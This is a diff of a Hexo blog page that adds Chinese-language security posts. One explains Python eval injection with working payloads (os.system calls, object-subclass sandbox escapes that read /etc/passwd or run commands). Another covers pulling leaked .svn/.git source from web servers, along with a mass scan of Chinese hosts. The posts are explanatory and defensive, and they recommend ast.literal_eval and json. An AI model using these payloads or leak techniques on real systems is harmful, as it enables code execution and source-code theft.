@@ -515,7 +515,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/04/29/hello-world/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/04/01/Python eval的常见错误封装及利用原理/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="xxlegend">
@@ -537,8 +537,8 @@
             
               
                 
-                <a class="post-title-link" href="/2017/04/29/hello-world/" itemprop="url">
-                  Hello World
+                <a class="post-title-link" href="/2017/04/01/Python eval的常见错误封装及利用原理/" itemprop="url">
+                  Python eval的常见错误封装及利用原理
                 </a>
               
             
@@ -554,8 +554,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-04-29T16:46:48+08:00">
-                2017-04-29
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-04-01T15:39:38+08:00">
+                2017-04-01
               </time>
             
 
@@ -565,6 +565,28 @@
           </span>
 
           
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Python/" itemprop="url" rel="index">
+                    <span itemprop="name">Python</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
 
           
             
@@ -573,9 +595,9 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2017/04/29/hello-world/#comments" itemprop="discussionUrl">
+                <a href="/2017/04/01/Python eval的常见错误封装及利用原理/#comments" itemprop="discussionUrl">
                   <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2017/04/29/hello-world/" itemprop="commentCount"></span>
+                        data-disqus-identifier="2017/04/01/Python eval的常见错误封装及利用原理/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -583,7 +605,7 @@
 
           
           
-             <span id="/2017/04/29/hello-world/" class="leancloud_visitors" data-flag-title="Hello World">
+             <span id="/2017/04/01/Python eval的常见错误封装及利用原理/" class="leancloud_visitors" data-flag-title="Python eval的常见错误封装及利用原理">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -613,15 +635,1596 @@
       
         
           
-            <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
+            <p>最近在代码评审的过程，发现挺多错误使用eval导致代码注入的问题，比较典型的就是把eval当解析dict使用，有的就是简单的使用eval，有的就是错误的封装了eval，供全产品使用，这引出的问题更严重，这些都是血淋淋的教训，大家使用的时候多加注意。<br>下面列举一个实际产品中的例子，详情见[bug83055][1]：</p>
+<pre><code>def remove(request, obj)：
+     query = query2dict(request.POST)
+     eval(query[&apos;oper_type&apos;])(query, customer_obj)
+</code></pre><p>而query就是POST直接转换而来，是用户可直接控制的，假如用户在url参数中输入<code>oper_type=__import__(&#39;os&#39;).system(&#39;sleep 5&#39;)</code> 则可以执行命令sleep，当然也可以执行任意系统命令或者任意可执行代码，危害是显而易见的，那我们来看看eval到底是做什么的，以及如何做才安全？</p>
+<h1 id="1，做什么"><a href="#1，做什么" class="headerlink" title="1，做什么"></a>1，做什么</h1><p>简单来说就是执行一段表达式</p>
+<pre><code>&gt;&gt;&gt; eval(&apos;2+2&apos;)
+4
+
+&gt;&gt;&gt; eval(&quot;&quot;&quot;{&apos;name&apos;:&apos;xiaoming&apos;,&apos;ip&apos;:&apos;10.10.10.10&apos;}&quot;&quot;&quot;)
+{&apos;ip&apos;: &apos;10.10.10.10&apos;, &apos;name&apos;: &apos;xiaoming&apos;}
+
+&gt;&gt;&gt; eval(&quot;__import__(&apos;os&apos;).system(&apos;uname&apos;)&quot;, {})
+Linux
+0
+</code></pre><p>从这三段代码来看，第一个很明显做计算用，第二个把string类型数据转换成python的数据类型，这里是dict，这也是咱们产品中常犯的错误。第三个就是坏小子会这么干，执行系统命令。<br>eval 可接受三个参数，eval(source[, globals[, locals]]) -&gt; value<br>globals必须是路径，locals则必须是键值对，默认取系统globals和locals</p>
+<h1 id="2，不正确的封装"><a href="#2，不正确的封装" class="headerlink" title="2，不正确的封装"></a>2，不正确的封装</h1><p>（1）下面我们来看一段咱们某个产品代码中的封装函数，见[bug][2]，或者<a href="http://blog.knownsec.com/2012/05/python%E7%9A%84%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%A8%81%E8%83%81%E4%B9%8Beval%EF%BC%88%EF%BC%89/" target="_blank" rel="external">网络上搜索排名比较高的代码</a>，eg：</p>
+<pre><code>def safe_eval(eval_str):
+    try:
+        #加入命名空间
+        safe_dict = {}
+        safe_dict[&apos;True&apos;] = True
+        safe_dict[&apos;False&apos;] = False
+        return eval(eval_str,{&apos;__builtins__&apos;:None},safe_dict)
+    except Exception,e:
+        traceback.print_exc()
+        return &apos;&apos;
+</code></pre><p>在这里<code>__builtins__</code>置为空了，所以像<code>__import__</code>这是内置变量就没有了，这个封装函数就安全了吗？下面我一步步道来：</p>
+<pre><code>&gt;&gt;&gt; dir(__builtins__)
+[&apos;ArithmeticError&apos;, &apos;AssertionError&apos;, &apos;AttributeError&apos;, &apos;BaseException&apos;, &apos;BufferError&apos;, &apos;BytesWarning&apos;, &apos;DeprecationWarning&apos;, &apos;EOFError&apos;, &apos;Ellipsis&apos;, &apos;EnvironmentError&apos;, &apos;Exception&apos;, &apos;False&apos;, &apos;FloatingPointError&apos;, &apos;FutureWarning&apos;, &apos;GeneratorExit&apos;, &apos;IOError&apos;, &apos;ImportError&apos;, &apos;ImportWarning&apos;, &apos;IndentationError&apos;, &apos;IndexError&apos;, &apos;KeyError&apos;, &apos;KeyboardInterrupt&apos;, &apos;LookupError&apos;, &apos;MemoryError&apos;, &apos;NameError&apos;, &apos;None&apos;, &apos;NotImplemented&apos;, &apos;NotImplementedError&apos;, &apos;OSError&apos;, &apos;OverflowError&apos;, &apos;PendingDeprecationWarning&apos;, &apos;ReferenceError&apos;, &apos;RuntimeError&apos;, &apos;RuntimeWarning&apos;, &apos;StandardError&apos;, &apos;StopIteration&apos;, &apos;SyntaxError&apos;, &apos;SyntaxWarning&apos;, &apos;SystemError&apos;, &apos;SystemExit&apos;, &apos;TabError&apos;, &apos;True&apos;, &apos;TypeError&apos;, &apos;UnboundLocalError&apos;, &apos;UnicodeDecodeError&apos;,
+</code></pre><p>列表项</p>
+<p> ‘UnicodeEncodeError’, ‘UnicodeError’, ‘UnicodeTranslateError’, ‘UnicodeWarning’, ‘UserWarning’, ‘ValueError’, ‘Warning’, ‘ZeroDivisionError’, ‘_’, ‘<strong>debug</strong>‘, ‘<strong>doc</strong>‘, ‘<strong>import</strong>‘, ‘<strong>name</strong>‘, ‘<strong>package</strong>‘, ‘abs’, ‘all’, ‘any’, ‘apply’, ‘basestring’, ‘bin’, ‘bool’, ‘buffer’, ‘bytearray’, ‘bytes’, ‘callable’, ‘chr’, ‘classmethod’, ‘cmp’, ‘coerce’, ‘compile’, ‘complex’, ‘copyright’, ‘credits’, ‘delattr’, ‘dict’, ‘dir’, ‘divmod’, ‘enumerate’, ‘eval’, ‘execfile’, ‘exit’, ‘file’, ‘filter’, ‘float’, ‘format’, ‘frozenset’, ‘getattr’, ‘globals’, ‘hasattr’, ‘hash’, ‘help’, ‘hex’, ‘id’, ‘input’, ‘int’, ‘intern’, ‘isinstance’, ‘issubclass’, ‘iter’, ‘len’, ‘license’, ‘list’, ‘locals’, ‘long’, ‘map’, ‘max’, ‘memoryview’, ‘min’, ‘next’, ‘object’, ‘oct’, ‘open’, ‘ord’, ‘pow’, ‘print’, ‘property’, ‘quit’, ‘range’, ‘raw_input’, ‘reduce’, ‘reload’, ‘repr’, ‘reversed’, ‘round’, ‘set’, ‘setattr’, ‘slice’, ‘sorted’, ‘staticmethod’, ‘str’, ‘sum’, ‘super’, ‘tuple’, ‘type’, ‘unichr’, ‘unicode’, ‘vars’, ‘xrange’, ‘zip’]</p>
+<p>从<code>__builtins__</code>可以看到其模块中有<code>__import__</code>,可以借助用来执行os的一些操作。如果置为空，再去执行eval函数呢，结果如下：</p>
+<pre><code>&gt;&gt;&gt; eval(&quot;__import__(&apos;os&apos;).system(&apos;uname&apos;)&quot;, {&apos;__builtins__&apos;:{}})
+Traceback (most recent call last):
+  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
+  File &quot;&lt;string&gt;&quot;, line 1, in &lt;module&gt;
+NameError: name &apos;__import__&apos; is not defined
+</code></pre><p>现在就是提示<code>__import__</code>未定义，不能成功执行了，看情况是安全了吧？答案当然是错的。<br>比如执行如下：</p>
+<pre><code>&gt;&gt;&gt; s = &quot;&quot;&quot;
+... (lambda fc=(
+...     lambda n: [
+...         c for c in
+...             ().__class__.__bases__[0].__subclasses__()
+...             if c.__name__ == n
+...         ][0]
+...     ):
+...     fc(&quot;function&quot;)(
+...         fc(&quot;code&quot;)(
+...             0,0,0,0,&quot;test&quot;,(),(),(),&quot;&quot;,&quot;&quot;,0,&quot;&quot;
+...         ),{}
+...     )()
+... )()
+... &quot;&quot;&quot;
+&gt;&gt;&gt; eval(s, {&apos;__builtins__&apos;:{}})
+Segmentation fault (core dumped)
+</code></pre><p>在这里用户定义了一段函数，这个函数调用，直接导致段错误<br>下面这段代码则是退出解释器：</p>
+<pre><code>&gt;&gt;&gt;
+&gt;&gt;&gt; s = &quot;&quot;&quot;
+... [
+...     c for c in
+...     ().__class__.__bases__[0].__subclasses__()
+...     if c.__name__ == &quot;Quitter&quot;
+... ][0](0)()
+... &quot;&quot;&quot;
+&gt;&gt;&gt; eval(s,{&apos;__builtins__&apos;:{}})
+liaoxinxi@RCM-RSAS-V6-Dev ~/tools/auto_judge $ 
+</code></pre><p>初步理解一下整个过程：</p>
+<pre><code>&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()
+[&lt;type &apos;type&apos;&gt;, &lt;type &apos;weakref&apos;&gt;, &lt;type &apos;weakcallableproxy&apos;&gt;, &lt;type &apos;weakproxy&apos;&gt;, &lt;type &apos;int&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;bytearray&apos;&gt;, &lt;type &apos;list&apos;&gt;, &lt;type &apos;NoneType&apos;&gt;, &lt;type &apos;NotImplementedType&apos;&gt;, &lt;type &apos;traceback&apos;&gt;, &lt;type &apos;super&apos;&gt;, &lt;type &apos;xrange&apos;&gt;, &lt;type &apos;dict&apos;&gt;, &lt;type &apos;set&apos;&gt;, &lt;type &apos;slice&apos;&gt;, &lt;type &apos;staticmethod&apos;&gt;, &lt;type &apos;complex&apos;&gt;, &lt;type &apos;float&apos;&gt;, &lt;type &apos;buffer&apos;&gt;, &lt;type &apos;long&apos;&gt;, &lt;type &apos;frozenset&apos;&gt;, &lt;type &apos;property&apos;&gt;, &lt;type &apos;memoryview&apos;&gt;, &lt;type &apos;tuple&apos;&gt;, &lt;type &apos;enumerate&apos;&gt;, &lt;type &apos;reversed&apos;&gt;, &lt;type &apos;code&apos;&gt;, &lt;type &apos;frame&apos;&gt;, &lt;type &apos;builtin_function_or_method&apos;&gt;, &lt;type &apos;instancemethod&apos;&gt;, &lt;type &apos;function&apos;&gt;, &lt;type &apos;classobj&apos;&gt;, &lt;type &apos;dictproxy&apos;&gt;, &lt;type &apos;generator&apos;&gt;, &lt;type &apos;getset_descriptor&apos;&gt;, &lt;type &apos;wrapper_descriptor&apos;&gt;, &lt;type &apos;instance&apos;&gt;, &lt;type &apos;ellipsis&apos;&gt;, &lt;type &apos;member_descriptor&apos;&gt;, &lt;type &apos;file&apos;&gt;, &lt;type &apos;sys.long_info&apos;&gt;, &lt;type &apos;sys.float_info&apos;&gt;, &lt;type &apos;EncodingMap&apos;&gt;, &lt;type &apos;sys.version_info&apos;&gt;, &lt;type &apos;sys.flags&apos;&gt;, &lt;type &apos;exceptions.BaseException&apos;&gt;, &lt;type &apos;module&apos;&gt;, &lt;type &apos;imp.NullImporter&apos;&gt;, &lt;type &apos;zipimport.zipimporter&apos;&gt;, &lt;type &apos;posix.stat_result&apos;&gt;, &lt;type &apos;posix.statvfs_result&apos;&gt;, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;, &lt;class &apos;_weakrefset.WeakSet&apos;&gt;, &lt;class &apos;_abcoll.Hashable&apos;&gt;, &lt;type &apos;classmethod&apos;&gt;, &lt;class &apos;_abcoll.Iterable&apos;&gt;, &lt;class &apos;_abcoll.Sized&apos;&gt;, &lt;class &apos;_abcoll.Container&apos;&gt;, &lt;class &apos;_abcoll.Callable&apos;&gt;, &lt;class &apos;site._Printer&apos;&gt;, &lt;class &apos;site._Helper&apos;&gt;, &lt;type &apos;_sre.SRE_Pattern&apos;&gt;, &lt;type &apos;_sre.SRE_Match&apos;&gt;, &lt;type &apos;_sre.SRE_Scanner&apos;&gt;, &lt;class &apos;site.Quitter&apos;&gt;, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;, &lt;type &apos;Struct&apos;&gt;, &lt;type &apos;cStringIO.StringO&apos;&gt;, &lt;type &apos;cStringIO.StringI&apos;&gt;, &lt;class &apos;configobj.InterpolationEngine&apos;&gt;, &lt;class &apos;configobj.SimpleVal&apos;&gt;, &lt;class &apos;configobj.InterpolationEngine&apos;&gt;, &lt;class &apos;configobj.SimpleVal&apos;&gt;]
+</code></pre><p>这句python代码的意思就是找tuple的class，再找它的基类，也就是object，再通过object找他的子类，具体的子类也如代码中的输出一样。从中可以看到了有file模块，zipimporter模块，是不是可以利用下呢？首先从file入手<br>假如用户如果构造：</p>
+<pre><code>&gt;&gt;&gt; s1 = &quot;&quot;&quot;
+... [
+...     c for c in
+...     ().__class__.__bases__[0].__subclasses__()
+...     if c.__name__ == &quot;file&quot;
+... ][0](&quot;/etc/passwd&quot;).read()()
+... &quot;&quot;&quot;
+&gt;&gt;&gt; eval(s1,{&apos;__builtins__&apos;:{}})
+Traceback (most recent call last):
+  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
+  File &quot;&lt;string&gt;&quot;, line 6, in &lt;module&gt;
+IOError: file() constructor not accessible in restricted mode
+</code></pre><p>这个restrictected mode简单理解就是python解释器的沙盒，一些功能被限制了，比如说不能修改系统，不能使用一些系统函数，如file，详情见<a href="http://grail.sourceforge.net/info/manual/restricted.html" target="_blank" rel="external">Restricted Execution Mode</a>，那怎么去绕过呢？这时我们就想到了zipimporter了，假如引入的模块中引用了os模块，我们就可以像如下代码来利用。</p>
+<pre><code>&gt;&gt;&gt; s2=&quot;&quot;&quot;
+... [x for x in ().__class__.__bases__[0].__subclasses__()
+...    if x.__name__ == &quot;zipimporter&quot;][0](
+...      &quot;/home/liaoxinxi/eval_test/configobj-4.4.0-py2.5.egg&quot;).load_module(
+...      &quot;configobj&quot;).os.system(&quot;uname&quot;)
+... &quot;&quot;&quot;
+&gt;&gt;&gt; eval(s2,{&apos;__builtins__&apos;:{}})
+Linux
+0
+</code></pre><p>这就验证了刚才的safe_eval其实是不安全的。</p>
+<h1 id="3，如何正确使用"><a href="#3，如何正确使用" class="headerlink" title="3，如何正确使用"></a>3，如何正确使用</h1><p>（1）使用ast.literal_eval<br>（2）如果仅仅是将字符转为dict，可以使用json格式</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/04/01/SVN和GIT信息泄漏利用原理及现状/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xxlegend">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xxlegend">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/04/01/SVN和GIT信息泄漏利用原理及现状/" itemprop="url">
+                  SVN和GIT信息泄漏利用原理及现状
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-04-01T15:38:36+08:00">
+                2017-04-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/信息泄露/" itemprop="url" rel="index">
+                    <span itemprop="name">信息泄露</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/04/01/SVN和GIT信息泄漏利用原理及现状/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2017/04/01/SVN和GIT信息泄漏利用原理及现状/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2017/04/01/SVN和GIT信息泄漏利用原理及现状/" class="leancloud_visitors" data-flag-title="SVN和GIT信息泄漏利用原理及现状">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="1，google-hack"><a href="#1，google-hack" class="headerlink" title="1，google hack"></a>1，google hack</h1><p>svn 搜索技巧<br>图1<br>git 搜索技巧<br>图2</p>
+<h1 id="2，svn信息利用原理"><a href="#2，svn信息利用原理" class="headerlink" title="2，svn信息利用原理"></a>2，svn信息利用原理</h1><h2 id="2-1-svn-lt-1-6"><a href="#2-1-svn-lt-1-6" class="headerlink" title="2.1 svn&lt;=1.6"></a>2.1 svn&lt;=1.6</h2><p>从svn的结构图可以看到一个目录text-base,这里有我们源文件的备份,比如要下载somedomain/phpinfo.php,直接访问目录somedomain/.svn/text-base/phpinfo.php.text-base,一般的服务器既不会阻止该目录也不会解释该后缀，我们就可以直接读到本地来。现在只是访问最顶层的文件信息，那怎么遍历呢？这里面就有.svn/entries，这个文件包含着该基础目录下所有的文件和目录，直接递推查找就行。</p>
+<h2 id="2-2-svn-gt-1-6"><a href="#2-2-svn-gt-1-6" class="headerlink" title="2.2 svn&gt;1.6"></a>2.2 svn&gt;1.6</h2><p>svn在1.6之后引入了wc.db来管理文件，该文件位于.svn/wc.db。普通文件位置：somedomain/.svn/pristine/“XX”/“CHECKSUM”.svn-base,CHECKSUM是文件的sha1值，xx则是他的前两位。那这个CHECKSUM去哪找呢？就是我们刚才提到的wc.db，这是一个sqlite数据库。数据库的大体结构如下：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span> sqlite3 wc.db .tables</div><div class="line">ACTUAL_NODE    NODES          PRISTINE       WC_LOCK</div><div class="line">EXTERNALS      NODES_BASE     REPOSITORY     WORK_QUEUE</div><div class="line">LOCK           NODES_CURRENT  WCROOT</div><div class="line"><span class="meta">$</span> sqlite3 wc.db 'select local_relpath, checksum from NODES'</div><div class="line">index.php|$sha1$4e6a225331f9ae872db25a8f85ae7be05cea6d51</div><div class="line">scripts/menu.js|$sha1$fabeb3ba6a96cf0cbcad1308abdbe0c2427eeebf</div><div class="line">style/style.js|$sha1$2cc5590e0ba024c3db77a13896da09b39ea74799</div><div class="line"><span class="meta">$</span> sqlite3 wc.db 'select local_relpath, ".svn/pristine/" || substr(checksum,7,2) || "/" || substr(checksum,7) || ".svn-base" as alpha from NODES;'</div><div class="line">index.php|.svn/pristine/4e/4e6a225331f9ae872db25a8f85ae7be05cea6d51.svn-base</div><div class="line">scripts/menu.js|.svn/pristine/fa/fabeb3ba6a96cf0cbcad1308abdbe0c2427eeebf.svn-base</div><div class="line">style/style.js|.svn/pristine/2s/2cc5590e0ba024c3db77a13896da09b39ea74799.svn-base</div></pre></td></tr></table></figure></p>
+<p>第一步下载wc.db,然后从NODES表中找到文件名和其sha1值，最后构造下载链接。</p>
+<h1 id="3，git-信息利用原理"><a href="#3，git-信息利用原理" class="headerlink" title="3，git 信息利用原理"></a>3，git 信息利用原理</h1><p>首先从git/config信息里面可以得到仓库地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">[core]</div><div class="line">	repositoryformatversion = 0</div><div class="line">	filemode = true</div><div class="line">	bare = false</div><div class="line">	logallrefupdates = true</div><div class="line">[remote &quot;origin&quot;]</div><div class="line">	fetch = +refs/heads/*:refs/remotes/origin/*</div><div class="line">	url = git@git.jingdigital.net:root/pcb001.git</div><div class="line">[branch &quot;master&quot;]</div><div class="line">	remote = origin</div><div class="line">	merge = refs/heads/master</div></pre></td></tr></table></figure></p>
+<p>基本上三步走：<br>（1）下载.git/index文件，这是一种git特有的格式，在该文件中包含着文件名和文件SHA1值。<br>（2）根据该文件SHA1值到objects目录下载相应文件，具体路径somedomain/.git/objects/“XX”/“CHECKSUM”<br>（3）zlib解压文件，按照原始目录写入源代码。</p>
+<h1 id="4，对国内80端口的简单扫描"><a href="#4，对国内80端口的简单扫描" class="headerlink" title="4，对国内80端口的简单扫描"></a>4，对国内80端口的简单扫描</h1><p>有了前面这些基础，就可以通过泄漏的信息来还原代码，能还原代码的话就可以干很多事了。最常见就是代码中泄漏email地址，数据库连接方式，调试接口，一些第三方key的泄漏。另外还可以对你感兴趣的目标进行代码审计，发现注入，命令执行等等。</p>
+<h2 id="4-1-扫描实现"><a href="#4-1-扫描实现" class="headerlink" title="4.1 扫描实现"></a>4.1 扫描实现</h2><p>（1）从文件读取80ip段数据，设最大并发16，最大连接数60，这个时候的带宽基本控制在600KB，利用周末时间跑了一天即可跑完。<br>（2）设置pycurl的一些参数，如PROXY,MAXREDIRS=0，这样就不跳转了，nosignal=1 这个参数必须为1，这是pycurl的一个bug，中间测试的过程中就是因为参数未加，导致跑了半天结果中途挂了。<br>（3）请求/.git/config信息，如果200，返回的类型为text/plain并且存在repositoryformatversion字段。请求/.svn/entries,如果200，Content-Type为text/plain,并且dir存在于返回值。其实这个是有误的，因为在svn大于1.6的情况下，在返回值中只有一个简单的数字，并不存在dir，所以扫描结果中基本上没有1.6以上的结果。</p>
+<h2 id="4-2-结果过滤"><a href="#4-2-结果过滤" class="headerlink" title="4.2 结果过滤"></a>4.2 结果过滤</h2><p>在扫描的结果中分析出现的url，有些.svn/entries返回200，但是首页确是有问题，还有发现某些ip不在中国。于是写了脚本去请求这些url的首页，并且从一个ip查询网站去查询ip地址归属。</p>
+<h2 id="4-3-初步结果"><a href="#4-3-初步结果" class="headerlink" title="4.3 初步结果"></a>4.3 初步结果</h2><p>在525万80端口数据中，跑出6000条结果，相当于千分之一的概率，另外还未包括前面对svn 1.6判断有误的分析，所以这个概率还是很高的。<br>简单的分析了git信息的泄漏，总共有接近600条数据，去除在国外的和首页不正常的，能达到250多，其中差不多一半的都是在阿里云的ip上，这些公司一般都是创业公司。在这些泄漏的代码中sql注入一般很少。<br>svn的话，一般都是一些比较老的网站，这主要可能还是我前面的判断逻辑有点小问题。注入问题比较严重。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/04/01/PhpWind 利用hash长度扩展攻击修改后台密码getshell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xxlegend">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xxlegend">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/04/01/PhpWind 利用hash长度扩展攻击修改后台密码getshell/" itemprop="url">
+                  Phpwind利用hash长度扩展攻击修改后台密码getshell
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-04-01T15:38:36+08:00">
+                2017-04-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Php/" itemprop="url" rel="index">
+                    <span itemprop="name">Php</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/04/01/PhpWind 利用hash长度扩展攻击修改后台密码getshell/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2017/04/01/PhpWind 利用hash长度扩展攻击修改后台密码getshell/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2017/04/01/PhpWind 利用hash长度扩展攻击修改后台密码getshell/" class="leancloud_visitors" data-flag-title="Phpwind利用hash长度扩展攻击修改后台密码getshell">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
